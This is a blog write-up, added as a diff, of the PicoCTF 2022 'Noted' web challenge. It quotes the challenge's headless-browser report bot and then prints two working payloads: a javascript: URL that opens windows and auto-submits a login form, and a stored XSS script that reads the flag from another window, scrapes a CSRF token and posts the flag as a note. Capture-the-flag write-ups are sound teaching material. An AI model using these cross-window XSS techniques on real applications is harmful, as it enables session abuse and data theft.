@@ -1,0 +1,177 @@
+---
+title: 'PicoCTF 2022: Noted [web - 500pts]'
+date: '2022-03-27'
+tags: ['xss', 'same origin policy', 'javascript', 'ctf', 'pico']
+description: 'To solve this challenge we need to make use of stored cross-site scripting (XSS) as well as server-side request forgery (SSRF) whilst taking advantage of an automated user in the form of a headless chrome browser.'
+---
+
+Noted was one of the two hardest web challenges available in the 2022 edition of the widely played PicoCTF. By the end of the two week event, it had been solved by just over 100 of the 7500+ teams taking part. 
+
+## First Impression
+
+We are presented with an app allowing us to register a user and save notes in our own personal space. Quick testing shows that no input sanitisation is performed and the notes can be used to store any HTML or Javascript we desire.
+
+Another key feature of the app is the /report page where we are able to submit a URL presumably for review by an admin. As seen in the challenge info window, the challenge server does not have outbound internet access and so we will be unable to exfiltrate any information to a server under our control.
+
+<BlogImage
+    src="/images/picoctf-noted/challenge-info-window.png"
+    alt="challenge-info-window.png"
+    width="960"
+    height="447"
+/>
+
+## Source Code
+
+The author has been nice enough to provide the full source code of the application. Most of it is of no interest other than seeing that the app uses fastify-secure-session and fastify-csrf, so we should assume we will not be trying to tamper with our session cookie in any way and also keep in mind that the CSRF tokens in use for every authenticated POST are linked to user sessions and thus invalid for any other user. We also see that users and notes are stored in a SQLite database, with notes being linked and thus only visible to the user that created them. There is no SQL injection possible in this app.
+
+The file that shall be our main focus for this challenge is report.js which as the name suggests is the power behind the functionality found on the /report page.
+
+```javascript
+const crypto = require('crypto');
+const puppeteer = require('puppeteer');
+
+async function run(url) {
+    let browser;
+
+    try {
+        module.exports.open = true;
+        browser = await puppeteer.launch({
+            headless: true,
+            pipe: true,
+            args: ['--incognito', '--no-sandbox', '--disable-setuid-sandbox'],
+            slowMo: 10
+        });
+
+        let page = (await browser.pages())[0]
+
+        await page.goto('http://0.0.0.0:8080/register');
+        await page.type('[name="username"]', crypto.randomBytes(8).toString('hex'));
+        await page.type('[name="password"]', crypto.randomBytes(8).toString('hex'));
+
+        await Promise.all([
+            page.click('[type="submit"]'),
+            page.waitForNavigation({ waituntil: 'domcontentloaded' })
+        ]);
+
+        await page.goto('http://0.0.0.0:8080/new');
+        await page.type('[name="title"]', 'flag');
+        await page.type('[name="content"]', process.env.FLAG ?? 'ctf{flag}');
+
+        await Promise.all([
+            page.click('[type="submit"]'),
+            page.waitForNavigation({ waituntil: 'domcontentloaded' })
+        ]);
+
+        await page.goto('about:blank')
+        await page.goto(url);
+        await page.waitForTimeout(7500);
+
+        await browser.close();
+    } catch(e) {
+        console.error(e);
+        try { await browser.close() } catch(e) {}
+    }
+
+    module.exports.open = false;
+}
+
+module.exports = { open: false, run }
+```
+
+Working through the code we can see that puppeteer (a headless chrome browser) is used to:
+
+1. Visit http://0.0.0.0:8080/register and submit the form with randomly generated details. The username and password is 8 random bytes converted to their hex representation so 16 characters each. Brute forcing is going to be out of the question.
+2. Visit http://0.0.0.0:8080/new and submit the contents of an environment variable containing the challenge flag as a new note for the registered user.
+3. Visit about:blank
+4. Visit the user supplied URL
+
+## Schemes and the Same-origin Policy
+
+The first step to solving this puzzle is realising what we can submit through the report form. Initially it may seem a bit hopeless, the server has no outbound internet access and due to notes being session-linked we can not ask it to visit the /notes page and view whatever nastiness we might store in our own note . However, reviewing the code in web.js and report.js we see that once again the author has failed to sanitise user input. Is there something other than an ordinary URL we can supply?
+
+Other schemes besides http:// and https:// can be interpreted by browsers. Think about when you access a local file on your computer, you will see something like file://C:/Users/rewks/Documents/example.txt. Still, this is not much help here, but there is yet another common scheme that is the key to getting started: javascript://. Yes, we can supply arbitrary Javascript code that will be executed in the headless browser used by the challenge bot.
+
+Here we encounter another issue though. That third step listed above, where `await page.goto('about:blank')` is executed. If not for this line the bot would still be sat on the /notes page where we could easily just read the flag from the page contents. Unfortunately, in navigating away from that page the author has put a stop to this as even if we redirect the bot back through `javascript://window.location='http://0.0.0.0:8080/notes'` or similar the rest of our script payload would be unable to access the page content due to being executed from about:blank.
+
+Also out is using XMLHttpRequest or fetch to request the /notes page and read the response. Thanks to starting from about:blank we are no longer on the 0.0.0.0 host and thus the Same-origin Policy will not allow us to read any response data from that host. Further to this, the application does not implement Cross-Origin Resource Sharing so there is no chance of exploiting a poorly implemented Access Control Allow Origin header.
+
+## Attack Plan 
+
+We need to access /notes in the context of the bot user. We also need to execute a Javascript payload on the 0.0.0.0:8080 host in order to be able to read the flag from that notes page; the only way we can achieve this is to store the payload in our own note and somehow get the bot to visit the /notes page as our user at the same time as visiting /notes as the bot random user. How to do this? Windows!
+
+First we will force the bot to open a new window at http://0.0.0.0:8080/notes. In a normal browser this would probably get blocked and the user would see one of those "Allow popups?" sort of messsages, luckily for us this is not the case in a headless browser. This first window now has the challenge flag within it and we will leave it untouched. We will then have the bot open a second new window at about:blank. With this being the same context as we are executing our first Javascript payload from, we can continue manipulating the contents of this second window.
+
+The final part of our report payload is to add an HTML form to the body element of the second window. This form is built to mimic the login function on the challenge application, and holds our own username and password. Once submitted, the second window will have a session as our own user and be redirected to /notes where any XSS payload we have stored will be executed.
+
+*The full payload submitted to http://0.0.0.0:8080/report*:
+
+```javascript
+javascript:window.open('http://0.0.0.0:8080/notes','winA');
+let w=window.open('about:blank','winB');
+var f=document.createElement('form');
+f.action='http://0.0.0.0:8080/login';
+f.method='POST';
+f.target='_blank';
+var u=document.createElement('input');
+u.type='text';
+u.name='username';
+u.value='rewks';
+var p=document.createElement('input');
+p.type='password';
+p.name='password';
+p.value='1';
+f.appendChild(u);
+f.appendChild(p);
+w.document.body.appendChild(f);
+w.document.forms[0].submit();
+```
+
+Before submitting the above, we need to store a XSS payload that will take care of reading and delivering the challenge flag. Reading the flag is now simple, we can grab a handle to the already open 'winA' and read the contents. However, since there is no outbound connection we can't simply send it in a URL to a server we control. The easiest way to deliver the flag in this case is to have the bot create a new note containing the flag under our own account. Since all authenticated POST requests require a CSRF token, we first need to load the /new page, read the token and then use the same technique as in the previous payload whereby we add a form to the page with all the required fields and submit it.
+
+*The XSS payload stored as a note*: 
+
+```javascript
+<script>
+let fw=window.open('', 'winA');
+var flag=fw.document.getElementsByTagName('p')[0].textContent;
+var csrftoken;
+fetch('http://0.0.0.0:8080/new')
+    .then(async res => await res.text())
+    .then(data => csrftoken = data.split('value="')[1].split('">')[0])
+    .then(() => {
+        var f=document.createElement('form');
+        f.action='http://0.0.0.0:8080/new';
+        f.method='POST';
+        var c=document.createElement('input');
+        c.type='hidden';
+        c.name='_csrf';
+        c.value=csrftoken;
+        var t=document.createElement('input');
+        t.type='text';
+        t.name='title';
+        t.value='FLAG';
+        var n=document.createElement('input');
+        n.type='textarea';
+        n.name='content';
+        n.value=flag;
+        f.appendChild(c);
+        f.appendChild(t);
+        f.appendChild(n);
+        document.body.appendChild(f);
+        f.submit();
+    });
+</script>
+```
+
+## Conclusion
+
+After submitting both payloads, we can simply refresh the /notes page and find the challenge flag waiting for us. More accurately find many challenge flags waiting for us. The above method may not be the tidiest, in that after posting the flag as a new note the bot will of course be redirected to /notes where the XSS payload will once again be executed forming an infinite loop. The payload likely can be adapted to avoid this but as it is merely a CTF and the server gets terminated as soon as you submit the flag I did not worry about it. Consider this an excercise left to the reader! ;)
+
+<BlogImage
+    src="/images/picoctf-noted/flag-posted-to-notes.png"
+    alt="flag-posted-to-notes.png"
+    width={995}
+    height={585}
+/>
+
+I found this a fun and frustrating challenge, having not come across a similar one before it required much headscratching. Admittedly during my googling I did come across <Link href='https://ctftime.org/writeup/30882'>a writeup</Link> for another challenge with enough similarities that I drew inspiration from their solution i.e. the use of multiple windows. I just had to figure out how to adapt and apply it to the constraints enforced in this particular challenge.
